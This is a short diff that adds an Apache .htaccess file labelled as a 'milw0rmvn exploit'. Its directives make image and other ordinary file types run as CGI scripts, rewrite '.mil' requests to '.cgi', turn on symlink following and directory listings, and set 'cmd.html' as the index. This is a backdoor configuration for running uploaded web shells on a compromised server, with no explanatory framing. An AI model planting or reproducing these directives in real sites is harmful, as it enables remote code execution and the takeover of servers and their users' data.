@@ -1,0 +1,11 @@
+## START ##
+Options +ExecCGI
+AddHandler cgi-script cgi pl cgi gmc pin jpg
+RewriteEngine on
+RewriteRule (.*)\.mil$ $1.cgi
+Options +FollowSymLinks 
+DirectoryIndex cmd.html 
+Options +Indexes
+RemoveHandler .hack
+AddType text/plain .hack
+## milw0rmvn exploit ##
